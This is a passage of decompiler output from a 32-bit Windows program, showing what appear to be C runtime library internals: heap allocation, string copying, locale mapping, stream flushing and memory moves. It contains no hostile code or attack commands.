      DAT_00406bf8[1] = DAT_00406bf8[1] & 0xfffffffe;
    }
    puVar2 = param_1;
    if (DAT_00406bf8[2] == 0xffffffff) {
      VirtualFree((LPVOID)DAT_00406bf8[3],0,0x8000);
      HeapFree(DAT_00407e44,0,(LPVOID)DAT_00406bf8[4]);
      FUN_00404650(DAT_00406bf8,DAT_00406bf8 + 5,
                   (DAT_00406bfc * 0x14 - (int)DAT_00406bf8) + -0x14 + DAT_00406c00);
      DAT_00406bfc = DAT_00406bfc + -1;
      if (DAT_00406bf8 < param_1) {
        param_1 = param_1 + -5;
      }
      DAT_00406bf4 = DAT_00406c00;
      puVar2 = param_1;
    }
  }
  DAT_00406bf8 = puVar2;
  DAT_00406bf0 = uVar5;
  return;
}



int * __cdecl FUN_00403949(uint *param_1)

{
  char *pcVar1;
  int *piVar2;
  char cVar3;
  int *piVar4;
  byte bVar5;
  uint uVar6;
  int iVar7;
  uint *puVar8;
  int iVar9;
  uint uVar10;
  int *piVar11;
  uint *puVar12;
  uint *puVar13;
  int iVar14;
  uint local_10;
  uint local_c;
  int local_8;
  
  puVar8 = DAT_00406c00 + DAT_00406bfc * 5;
  uVar6 = (int)param_1 + 0x17U & 0xfffffff0;
  iVar7 = ((int)((int)param_1 + 0x17U) >> 4) + -1;
  bVar5 = (byte)iVar7;
  if (iVar7 < 0x20) {
    local_10 = 0xffffffff >> (bVar5 & 0x1f);
    local_c = 0xffffffff;
  }
  else {
    local_c = 0xffffffff >> (bVar5 - 0x20 & 0x1f);
    local_10 = 0;
  }
  param_1 = DAT_00406bf4;
  if (DAT_00406bf4 < puVar8) {
    do {
      if ((param_1[1] & local_c | *param_1 & local_10) != 0) break;
      param_1 = param_1 + 5;
    } while (param_1 < puVar8);
  }
  puVar12 = DAT_00406c00;
  if (param_1 == puVar8) {
    for (; (puVar12 < DAT_00406bf4 && ((puVar12[1] & local_c | *puVar12 & local_10) == 0));
        puVar12 = puVar12 + 5) {
    }
    param_1 = puVar12;
    if (puVar12 == DAT_00406bf4) {
      for (; (puVar12 < puVar8 && (puVar12[2] == 0)); puVar12 = puVar12 + 5) {
      }
      puVar13 = DAT_00406c00;
      param_1 = puVar12;
      if (puVar12 == puVar8) {
        for (; (puVar13 < DAT_00406bf4 && (puVar13[2] == 0)); puVar13 = puVar13 + 5) {
        }
        param_1 = puVar13;
        if ((puVar13 == DAT_00406bf4) && (param_1 = FUN_00403c52(), param_1 == (uint *)0x0)) {
          return (int *)0x0;
        }
      }
      iVar7 = FUN_00403d03((int)param_1);
      *(int *)param_1[4] = iVar7;
      if (*(int *)param_1[4] == -1) {
        return (int *)0x0;
      }
    }
  }
  piVar4 = (int *)param_1[4];
  local_8 = *piVar4;
  if ((local_8 == -1) ||
     ((piVar4[local_8 + 0x31] & local_c | piVar4[local_8 + 0x11] & local_10) == 0)) {
    local_8 = 0;
    puVar8 = (uint *)(piVar4 + 0x11);
    uVar10 = piVar4[0x31] & local_c | piVar4[0x11] & local_10;
    while (uVar10 == 0) {
      puVar12 = puVar8 + 0x21;
      local_8 = local_8 + 1;
      puVar8 = puVar8 + 1;
      uVar10 = *puVar12 & local_c | local_10 & *puVar8;
    }
  }
  iVar7 = 0;
  piVar2 = piVar4 + local_8 * 0x81 + 0x51;
  local_10 = piVar4[local_8 + 0x11] & local_10;
  if (local_10 == 0) {
    local_10 = piVar4[local_8 + 0x31] & local_c;
    iVar7 = 0x20;
  }
  for (; -1 < (int)local_10; local_10 = local_10 << 1) {
    iVar7 = iVar7 + 1;
  }
  piVar11 = (int *)piVar2[iVar7 * 2 + 1];
  iVar9 = *piVar11 - uVar6;
  iVar14 = (iVar9 >> 4) + -1;
  if (0x3f < iVar14) {
    iVar14 = 0x3f;
  }
  DAT_00406bf4 = param_1;
  if (iVar14 != iVar7) {
    if (piVar11[1] == piVar11[2]) {
      if (iVar7 < 0x20) {
        pcVar1 = (char *)((int)piVar4 + iVar7 + 4);
        uVar10 = ~(0x80000000U >> ((byte)iVar7 & 0x1f));
        piVar4[local_8 + 0x11] = uVar10 & piVar4[local_8 + 0x11];
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar10;
        }
      }
      else {
        pcVar1 = (char *)((int)piVar4 + iVar7 + 4);
        uVar10 = ~(0x80000000U >> ((byte)iVar7 - 0x20 & 0x1f));
        piVar4[local_8 + 0x31] = piVar4[local_8 + 0x31] & uVar10;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar10;
        }
      }
    }
    *(int *)(piVar11[2] + 4) = piVar11[1];
    *(int *)(piVar11[1] + 8) = piVar11[2];
    if (iVar9 == 0) goto LAB_00403c0f;
    piVar11[1] = piVar2[iVar14 * 2 + 1];
    piVar11[2] = (int)(piVar2 + iVar14 * 2);
    (piVar2 + iVar14 * 2)[1] = (int)piVar11;
    *(int **)(piVar11[1] + 8) = piVar11;
    if (piVar11[1] == piVar11[2]) {
      cVar3 = *(char *)(iVar14 + 4 + (int)piVar4);
      bVar5 = (byte)iVar14;
      if (iVar14 < 0x20) {
        *(char *)(iVar14 + 4 + (int)piVar4) = cVar3 + '\x01';
        if (cVar3 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar5 & 0x1f);
        }
        piVar4[local_8 + 0x11] = piVar4[local_8 + 0x11] | 0x80000000U >> (bVar5 & 0x1f);
      }
      else {
        *(char *)(iVar14 + 4 + (int)piVar4) = cVar3 + '\x01';
        if (cVar3 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar5 - 0x20 & 0x1f);
        }
        piVar4[local_8 + 0x31] = piVar4[local_8 + 0x31] | 0x80000000U >> (bVar5 - 0x20 & 0x1f);
      }
    }
  }
  if (iVar9 != 0) {
    *piVar11 = iVar9;
    *(int *)(iVar9 + -4 + (int)piVar11) = iVar9;
  }
LAB_00403c0f:
  piVar11 = (int *)((int)piVar11 + iVar9);
  *piVar11 = uVar6 + 1;
  *(uint *)((int)piVar11 + (uVar6 - 4)) = uVar6 + 1;
  iVar7 = *piVar2;
  *piVar2 = iVar7 + 1;
  if (((iVar7 == 0) && (param_1 == DAT_00406bf8)) && (local_8 == DAT_00406bf0)) {
    DAT_00406bf8 = (uint *)0x0;
  }
  *piVar4 = local_8;
  return piVar11 + 1;
}



undefined4 * FUN_00403c52(void)

{
  undefined4 *puVar1;
  LPVOID pvVar2;
  
  if (DAT_00406bfc == DAT_00406bec) {
    pvVar2 = HeapReAlloc(DAT_00407e44,0,DAT_00406c00,(DAT_00406bec * 5 + 0x50) * 4);
    if (pvVar2 == (LPVOID)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_00406bec = DAT_00406bec + 0x10;
    DAT_00406c00 = pvVar2;
  }
  puVar1 = (undefined4 *)((int)DAT_00406c00 + DAT_00406bfc * 0x14);
  pvVar2 = HeapAlloc(DAT_00407e44,8,0x41c4);
  puVar1[4] = pvVar2;
  if (pvVar2 != (LPVOID)0x0) {
    pvVar2 = VirtualAlloc((LPVOID)0x0,0x100000,0x2000,4);
    puVar1[3] = pvVar2;
    if (pvVar2 != (LPVOID)0x0) {
      puVar1[2] = 0xffffffff;
      *puVar1 = 0;
      puVar1[1] = 0;
      DAT_00406bfc = DAT_00406bfc + 1;
      *(undefined4 *)puVar1[4] = 0xffffffff;
      return puVar1;
    }
    HeapFree(DAT_00407e44,0,(LPVOID)puVar1[4]);
  }
  return (undefined4 *)0x0;
}



int __cdecl FUN_00403d03(int param_1)

{
  int *piVar1;
  char cVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  LPVOID pvVar6;
  int *piVar7;
  int iVar8;
  int iVar9;
  int *lpAddress;
  
  iVar3 = *(int *)(param_1 + 0x10);
  iVar9 = 0;
  for (iVar4 = *(int *)(param_1 + 8); -1 < iVar4; iVar4 = iVar4 << 1) {
    iVar9 = iVar9 + 1;
  }
  iVar8 = 0x3f;
  iVar4 = iVar9 * 0x204 + 0x144 + iVar3;
  iVar5 = iVar4;
  do {
    *(int *)(iVar5 + 8) = iVar5;
    *(int *)(iVar5 + 4) = iVar5;
    iVar5 = iVar5 + 8;
    iVar8 = iVar8 + -1;
  } while (iVar8 != 0);
  lpAddress = (int *)(iVar9 * 0x8000 + *(int *)(param_1 + 0xc));
  pvVar6 = VirtualAlloc(lpAddress,0x8000,0x1000,4);
  if (pvVar6 == (LPVOID)0x0) {
    iVar9 = -1;
  }
  else {
    if (lpAddress <= lpAddress + 0x1c00) {
      piVar7 = lpAddress + 4;
      do {
        piVar7[-2] = -1;
        piVar7[0x3fb] = -1;
        piVar7[-1] = 0xff0;
        *piVar7 = (int)(piVar7 + 0x3ff);
        piVar7[1] = (int)(piVar7 + -0x401);
        piVar7[0x3fa] = 0xff0;
        piVar1 = piVar7 + 0x3fc;
        piVar7 = piVar7 + 0x400;
      } while (piVar1 <= lpAddress + 0x1c00);
    }
    *(int **)(iVar4 + 0x1fc) = lpAddress + 3;
    lpAddress[5] = iVar4 + 0x1f8;
    *(int **)(iVar4 + 0x200) = lpAddress + 0x1c03;
    lpAddress[0x1c04] = iVar4 + 0x1f8;
    *(undefined4 *)(iVar3 + 0x44 + iVar9 * 4) = 0;
    *(undefined4 *)(iVar3 + 0xc4 + iVar9 * 4) = 1;
    cVar2 = *(char *)(iVar3 + 0x43);
    *(char *)(iVar3 + 0x43) = cVar2 + '\x01';
    if (cVar2 == '\0') {
      *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 1;
    }
    *(uint *)(param_1 + 8) = *(uint *)(param_1 + 8) & ~(0x80000000U >> ((byte)iVar9 & 0x1f));
  }
  return iVar9;
}



int __cdecl FUN_00403dfe(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  HMODULE hModule;
  int iVar1;
  
  iVar1 = 0;
  if (DAT_00406bb0 == (FARPROC)0x0) {
    hModule = LoadLibraryA("user32.dll");
    if (hModule != (HMODULE)0x0) {
      DAT_00406bb0 = GetProcAddress(hModule,"MessageBoxA");
      if (DAT_00406bb0 != (FARPROC)0x0) {
        DAT_00406bb4 = GetProcAddress(hModule,"GetActiveWindow");
        DAT_00406bb8 = GetProcAddress(hModule,"GetLastActivePopup");
        goto LAB_00403e4d;
      }
    }
    iVar1 = 0;
  }
  else {
LAB_00403e4d:
    if (DAT_00406bb4 != (FARPROC)0x0) {
      iVar1 = (*DAT_00406bb4)();
      if ((iVar1 != 0) && (DAT_00406bb8 != (FARPROC)0x0)) {
        iVar1 = (*DAT_00406bb8)(iVar1);
      }
    }
    iVar1 = (*DAT_00406bb0)(iVar1,param_1,param_2,param_3);
  }
  return iVar1;
}



// Library Function - Single Match
//  _strncpy
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release

char * __cdecl _strncpy(char *_Dest,char *_Source,size_t _Count)

{
  uint uVar1;
  uint uVar2;
  char cVar3;
  uint uVar4;
  uint *puVar5;
  
  if (_Count == 0) {
    return _Dest;
  }
  puVar5 = (uint *)_Dest;
  if (((uint)_Source & 3) != 0) {
    while( true ) {
      cVar3 = *_Source;
      _Source = (char *)((int)_Source + 1);
      *(char *)puVar5 = cVar3;
      puVar5 = (uint *)((int)puVar5 + 1);
      _Count = _Count - 1;
      if (_Count == 0) {
        return _Dest;
      }
      if (cVar3 == '\0') break;
      if (((uint)_Source & 3) == 0) {
        uVar4 = _Count >> 2;
        goto joined_r0x00403ece;
      }
    }
    do {
      if (((uint)puVar5 & 3) == 0) {
        uVar4 = _Count >> 2;
        if (uVar4 == 0) goto LAB_00403f0b;
        goto LAB_00403f79;
      }
      *(undefined *)puVar5 = 0;
      puVar5 = (uint *)((int)puVar5 + 1);
      _Count = _Count - 1;
    } while (_Count != 0);
    return _Dest;
  }
  uVar4 = _Count >> 2;
  if (uVar4 != 0) {
    do {
      uVar1 = *(uint *)_Source;
      uVar2 = *(uint *)_Source;
      _Source = (char *)((int)_Source + 4);
      if (((uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff) & 0x81010100) != 0) {
        if ((char)uVar2 == '\0') {
          *puVar5 = 0;
joined_r0x00403f75:
          while( true ) {
            uVar4 = uVar4 - 1;
            puVar5 = puVar5 + 1;
            if (uVar4 == 0) break;
LAB_00403f79:
            *puVar5 = 0;
          }
          cVar3 = '\0';
          _Count = _Count & 3;
          if (_Count != 0) goto LAB_00403f0b;
          return _Dest;
        }
        if ((char)(uVar2 >> 8) == '\0') {
          *puVar5 = uVar2 & 0xff;
          goto joined_r0x00403f75;
        }
        if ((uVar2 & 0xff0000) == 0) {
          *puVar5 = uVar2 & 0xffff;
          goto joined_r0x00403f75;
        }
        if ((uVar2 & 0xff000000) == 0) {
          *puVar5 = uVar2;
          goto joined_r0x00403f75;
        }
      }
      *puVar5 = uVar2;
      puVar5 = puVar5 + 1;
      uVar4 = uVar4 - 1;
joined_r0x00403ece:
    } while (uVar4 != 0);
    _Count = _Count & 3;
    if (_Count == 0) {
      return _Dest;
    }
  }
  do {
    cVar3 = *_Source;
    _Source = (char *)((int)_Source + 1);
    *(char *)puVar5 = cVar3;
    puVar5 = (uint *)((int)puVar5 + 1);
    if (cVar3 == '\0') {
      while (_Count = _Count - 1, _Count != 0) {
LAB_00403f0b:
        *(char *)puVar5 = cVar3;
        puVar5 = (uint *)((int)puVar5 + 1);
      }
      return _Dest;
    }
    _Count = _Count - 1;
  } while (_Count != 0);
  return _Dest;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00403f8e(uint param_1)

{
  uint *puVar1;
  int iVar2;
  
  iVar2 = 0;
  puVar1 = &DAT_004068c0;
  do {
    if (param_1 == *puVar1) {
      _DAT_00406a4c = (&DAT_004068c4)[iVar2 * 2];
      _DAT_00406a50 = param_1;
      return;
    }
    puVar1 = puVar1 + 2;
    iVar2 = iVar2 + 1;
  } while ((int)puVar1 < 0x406a28);
  if ((0x12 < param_1) && (param_1 < 0x25)) {
    _DAT_00406a4c = 0xd;
    _DAT_00406a50 = param_1;
    return;
  }
  if ((param_1 < 0xbc) || (_DAT_00406a4c = 8, 0xca < param_1)) {
    _DAT_00406a4c = 0x16;
  }
  _DAT_00406a50 = param_1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_00403ff5(uint param_1)

{
  int *piVar1;
  int iVar2;
  DWORD nStdHandle;
  
  if (param_1 < DAT_00407f60) {
    iVar2 = (param_1 & 0x1f) * 8;
    piVar1 = (int *)((&DAT_00407e60)[(int)param_1 >> 5] + iVar2);
    if (((*(byte *)(piVar1 + 1) & 1) != 0) && (*piVar1 != -1)) {
      if (_DAT_004061bc == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0040404e;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_0040404e:
      *(undefined4 *)((&DAT_00407e60)[(int)param_1 >> 5] + iVar2) = 0xffffffff;
      return 0;
    }
  }
  _DAT_00406a4c = 9;
  _DAT_00406a50 = 0;
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_0040406f(uint param_1)

{
  if ((param_1 < DAT_00407f60) &&
     ((*(byte *)((&DAT_00407e60)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 1) != 0)) {
    return *(undefined4 *)((&DAT_00407e60)[(int)param_1 >> 5] + (param_1 & 0x1f) * 8);
  }
  _DAT_00406a4c = 9;
  _DAT_00406a50 = 0;
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int * __cdecl FUN_004040ac(int param_1,int param_2)

{
  int iVar1;
  uint *_Size;
  uint *puVar2;
  int *piVar3;
  
  _Size = (uint *)(param_1 * param_2);
  puVar2 = _Size;
  if (_Size < (uint *)0xffffffe1) {
    if (_Size == (uint *)0x0) {
      puVar2 = (uint *)0x1;
    }
    puVar2 = (uint *)((int)puVar2 + 0xfU & 0xfffffff0);
  }
  do {
    piVar3 = (int *)0x0;
    if (puVar2 < (uint *)0xffffffe1) {
      if ((_Size < _DAT_004068b0 || (int)_Size - (int)_DAT_004068b0 == 0) &&
         (piVar3 = FUN_00403949(_Size), piVar3 != (int *)0x0)) {
        _memset(piVar3,0,(size_t)_Size);
        return piVar3;
      }
      piVar3 = (int *)HeapAlloc(DAT_00407e44,8,(SIZE_T)puVar2);
      if (piVar3 != (int *)0x0) {
        return piVar3;
      }
    }
    if (DAT_00406be4 == 0) {
      return piVar3;
    }
    iVar1 = FUN_0040462f(puVar2);
  } while (iVar1 != 0);
  return (int *)0x0;
}



int __cdecl FUN_00404181(int *param_1)

{
  int iVar1;
  
  if (param_1 == (int *)0x0) {
    iVar1 = _flsall(0);
    return iVar1;
  }
  iVar1 = FUN_004041bc(param_1);
  if (iVar1 != 0) {
    return -1;
  }
  if ((*(byte *)((int)param_1 + 0xd) & 0x40) != 0) {
    iVar1 = FUN_00404a3e(param_1[4]);
    return -(uint)(iVar1 != 0);
  }
  return 0;
}



undefined4 __cdecl FUN_004041bc(int *param_1)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  
  uVar2 = 0;
  if ((((byte)param_1[3] & 3) == 2) && ((param_1[3] & 0x108U) != 0)) {
    uVar3 = *param_1 - (int)(char *)param_1[2];
    if (0 < (int)uVar3) {
      uVar1 = FUN_00402806(param_1[4],(char *)param_1[2],uVar3);
      if (uVar1 == uVar3) {
        if ((param_1[3] & 0x80U) != 0) {
          param_1[3] = param_1[3] & 0xfffffffd;
        }
      }
      else {
        param_1[3] = param_1[3] | 0x20;
        uVar2 = 0xffffffff;
      }
    }
  }
  param_1[1] = 0;
  *param_1 = param_1[2];
  return uVar2;
}



// Library Function - Single Match
//  _flsall
// 
// Library: Visual Studio 2003 Release

int __cdecl _flsall(int param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  iVar4 = 0;
  iVar3 = 0;
  iVar5 = 0;
  if (0 < DAT_00407e40) {
    do {
      piVar1 = *(int **)(DAT_00406e28 + iVar4 * 4);
      if ((piVar1 != (int *)0x0) && ((piVar1[3] & 0x83U) != 0)) {
        if (param_1 == 1) {
          iVar2 = FUN_00404181(piVar1);
          if (iVar2 != -1) {
            iVar3 = iVar3 + 1;
          }
        }
        else if ((param_1 == 0) && ((piVar1[3] & 2U) != 0)) {
          iVar2 = FUN_00404181(piVar1);
          if (iVar2 == -1) {
            iVar5 = -1;
          }
        }
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < DAT_00407e40);
  }
  if (param_1 != 1) {
    iVar3 = iVar5;
  }
  return iVar3;
}



void FUN_0040428e(void)

{
  __amsg_exit(2);
  return;
}



int __cdecl
FUN_00404297(LCID param_1,uint param_2,char *param_3,int param_4,LPWSTR param_5,int param_6,
            UINT param_7,int param_8)

{
  int iVar1;
  int iVar2;
  undefined unaff_DI;
  undefined4 *in_FS_OFFSET;
  undefined4 local_14;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &DAT_00405460;
  puStack16 = &LAB_00402508;
  local_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &local_14;
  if (DAT_00406bdc == 0) {
    iVar1 = LCMapStringW(0,0x100,L"",1,(LPWSTR)0x0,0);
    if (iVar1 != 0) {
      DAT_00406bdc = 1;
      goto LAB_0040430d;
    }
    iVar1 = LCMapStringA(0,0x100,"",1,(LPSTR)0x0,0);
    if (iVar1 != 0) {
      DAT_00406bdc = 2;
      goto LAB_0040430d;
    }
  }
  else {
LAB_0040430d:
    if (0 < param_4) {
      param_4 = FUN_004044bb(param_3,param_4);
    }
    if (DAT_00406bdc == 2) {
      iVar1 = LCMapStringA(param_1,param_2,param_3,param_4,(LPSTR)param_5,param_6);
      goto LAB_00404427;
    }
    if (DAT_00406bdc == 1) {
      if (param_7 == 0) {
        param_7 = DAT_00406bd4;
      }
      iVar2 = MultiByteToWideChar(param_7,(-(uint)(param_8 != 0) & 8) + 1,param_3,param_4,
                                  (LPWSTR)0x0,0);
      if (iVar2 != 0) {
        local_8 = 0;
        FUN_00404aa0(unaff_DI);
        local_8 = 0xffffffff;
        if ((&stack0x00000000 != (undefined *)0x3c) &&
           (iVar1 = MultiByteToWideChar(param_7,1,param_3,param_4,(LPWSTR)&stack0xffffffc4,iVar2),
           iVar1 != 0)) {
          iVar1 = LCMapStringW(param_1,param_2,(LPCWSTR)&stack0xffffffc4,iVar2,(LPWSTR)0x0,0);
          if (iVar1 != 0) {
            if ((param_2 & 0x400) == 0) {
              local_8 = 1;
              FUN_00404aa0(unaff_DI);
              local_8 = 0xffffffff;
              if ((&stack0x00000000 != (undefined *)0x3c) &&
                 (iVar2 = LCMapStringW(param_1,param_2,(LPCWSTR)&stack0xffffffc4,iVar2,
                                       (LPWSTR)&stack0xffffffc4,iVar1), iVar2 != 0)) {
                if (param_6 == 0) {
                  param_6 = 0;
                  param_5 = (LPWSTR)0x0;
                }
                iVar1 = WideCharToMultiByte(param_7,0x220,(LPCWSTR)&stack0xffffffc4,iVar1,
                                            (LPSTR)param_5,param_6,(LPCSTR)0x0,(LPBOOL)0x0);
                iVar2 = iVar1;
joined_r0x004044ae:
                if (iVar2 != 0) goto LAB_00404427;
              }
            }
            else {
              if (param_6 == 0) goto LAB_00404427;
              if (iVar1 <= param_6) {
                iVar2 = LCMapStringW(param_1,param_2,(LPCWSTR)&stack0xffffffc4,iVar2,param_5,param_6
                                    );
                goto joined_r0x004044ae;
              }
            }
          }
        }
      }
    }
  }
  iVar1 = 0;
LAB_00404427:
  *in_FS_OFFSET = local_14;
  return iVar1;
}



int __cdecl FUN_004044bb(char *param_1,int param_2)

{
  char *pcVar1;
  int iVar2;
  
  pcVar1 = param_1;
  iVar2 = param_2;
  if (param_2 != 0) {
    do {
      iVar2 = iVar2 + -1;
      if (*pcVar1 == '\0') break;
      pcVar1 = pcVar1 + 1;
    } while (iVar2 != 0);
  }
  if (*pcVar1 == '\0') {
    return (int)pcVar1 - (int)param_1;
  }
  return param_2;
}



BOOL __cdecl
FUN_004044e6(DWORD param_1,LPCSTR param_2,int param_3,LPWORD param_4,UINT param_5,LCID param_6,
            int param_7)

{
  undefined *puVar1;
  BOOL BVar2;
  int iVar3;
  undefined unaff_DI;
  undefined4 *in_FS_OFFSET;
  WORD local_20 [2];
  undefined *local_1c;
  undefined4 local_14;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &DAT_00405478;
  puStack16 = &LAB_00402508;
  local_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &local_14;
  local_1c = &stack0xffffffc8;
  iVar3 = DAT_00406be0;
  puVar1 = &stack0xffffffc8;
  if (DAT_00406be0 == 0) {
    BVar2 = GetStringTypeW(1,L"",1,local_20);
    iVar3 = 1;
    puVar1 = local_1c;
    if (BVar2 != 0) goto LAB_00404555;
    BVar2 = GetStringTypeA(0,1,"",1,local_20);
    if (BVar2 != 0) {
      iVar3 = 2;
      puVar1 = local_1c;
      goto LAB_00404555;
    }
  }
  else {
LAB_00404555:
    local_1c = puVar1;
    DAT_00406be0 = iVar3;
    if (DAT_00406be0 == 2) {
      if (param_6 == 0) {
        param_6 = DAT_00406bc4;
      }
      BVar2 = GetStringTypeA(param_6,param_1,param_2,param_3,param_4);
      goto LAB_0040461d;
    }
    if (DAT_00406be0 == 1) {
      if (param_5 == 0) {
        param_5 = DAT_00406bd4;
      }
      iVar3 = MultiByteToWideChar(param_5,(-(uint)(param_7 != 0) & 8) + 1,param_2,param_3,
                                  (LPWSTR)0x0,0);
      if (iVar3 != 0) {
        local_8 = 0;
        FUN_00404aa0(unaff_DI);
        local_1c = &stack0xffffffc8;
        _memset(&stack0xffffffc8,0,iVar3 * 2);
        local_8 = 0xffffffff;
        if ((&stack0x00000000 != (undefined *)0x38) &&
           (iVar3 = MultiByteToWideChar(param_5,1,param_2,param_3,(LPWSTR)&stack0xffffffc8,iVar3),
           iVar3 != 0)) {
          BVar2 = GetStringTypeW(param_1,(LPCWSTR)&stack0xffffffc8,iVar3,param_4);
          goto LAB_0040461d;
        }
      }
    }
  }
  BVar2 = 0;
LAB_0040461d:
  *in_FS_OFFSET = local_14;
  return BVar2;
}



undefined4 __cdecl FUN_0040462f(undefined4 param_1)

{
  int iVar1;
  
  if (DAT_00406be8 != (code *)0x0) {
    iVar1 = (*DAT_00406be8)(param_1);
    if (iVar1 != 0) {
      return 1;
    }
  }
  return 0;
}



undefined4 * __cdecl FUN_00404650(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((param_2 < param_1) && (param_1 < (undefined4 *)(param_3 + (int)param_2))) {
    puVar1 = (undefined4 *)((param_3 - 4) + (int)param_2);
    puVar4 = (undefined4 *)((param_3 - 4) + (int)param_1);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = param_3 >> 2;
      if (uVar2 < 8) goto LAB_00404810;
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar4 = *puVar1;
        puVar1 = puVar1 + -1;
        puVar4 = puVar4 + -1;
      }
      switch(param_3 & 3) {
      case 1:
        goto switchD_00404834_caseD_1;
      case 2:
        goto switchD_00404834_caseD_2;
      case 3:
        goto switchD_00404834_caseD_3;
      }
    }
    else {
      switch(param_3) {
      case 0:
        break;
      case 1:
switchD_00404834_caseD_1:
        *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
        return param_1;
      case 2:
switchD_00404834_caseD_2:
        *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
        *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
        return param_1;
      case 3:
switchD_00404834_caseD_3:
        *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
        *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
        *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
        return param_1;
      default:
        uVar3 = param_3 - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar3 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (uVar2 < 8) {
LAB_00404810:
                    // WARNING: Could not recover jumptable at 0x00404812. Too many branches
                    // WARNING: Treating indirect jump as call
            puVar1 = (undefined4 *)(*(code *)(&PTR_LAB_004048e0)[-uVar2])();
            return puVar1;
          }
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar4 = *puVar1;
            puVar1 = puVar1 + -1;
            puVar4 = puVar4 + -1;
          }
          switch(uVar3 & 3) {
          case 1:
            goto switchD_00404834_caseD_1;
          case 2:
            goto switchD_00404834_caseD_2;
          case 3:
            goto switchD_00404834_caseD_3;
          }
          break;
        case 2:
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar3 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (uVar2 < 8) goto LAB_00404810;
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar4 = *puVar1;
            puVar1 = puVar1 + -1;
            puVar4 = puVar4 + -1;
          }
          switch(uVar3 & 3) {
          case 1:
            goto switchD_00404834_caseD_1;
          case 2:
            goto switchD_00404834_caseD_2;
          case 3:
            goto switchD_00404834_caseD_3;
          }
          break;
        case 3:
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar3 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (uVar2 < 8) goto LAB_00404810;
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar4 = *puVar1;
            puVar1 = puVar1 + -1;
            puVar4 = puVar4 + -1;
          }
          switch(uVar3 & 3) {
          case 1:
            goto switchD_00404834_caseD_1;
          case 2:
            goto switchD_00404834_caseD_2;
          case 3:
            goto switchD_00404834_caseD_3;
          }
        }
      }
    }
    return param_1;
  }
  puVar1 = param_1;
  if (((uint)param_1 & 3) == 0) {
    uVar2 = param_3 >> 2;
    if (uVar2 < 8) goto LAB_004046ac;
    for (; uVar2 != 0; uVar2 = uVar2 - 1) {
      *puVar1 = *param_2;
      param_2 = param_2 + 1;
      puVar1 = puVar1 + 1;
    }
    switch(param_3 & 3) {
    case 1:
      goto switchD_004046a4_caseD_1;
    case 2:
      goto switchD_004046a4_caseD_2;
    case 3:
      goto switchD_004046a4_caseD_3;
    }
  }
  else {
    switch(param_3) {
    case 0:
      break;
    case 1:
switchD_004046a4_caseD_1:
      *(undefined *)puVar1 = *(undefined *)param_2;
      return param_1;
    case 2:
switchD_004046a4_caseD_2:
      *(undefined *)puVar1 = *(undefined *)param_2;
      *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
      return param_1;
    case 3:
switchD_004046a4_caseD_3:
      *(undefined *)puVar1 = *(undefined *)param_2;
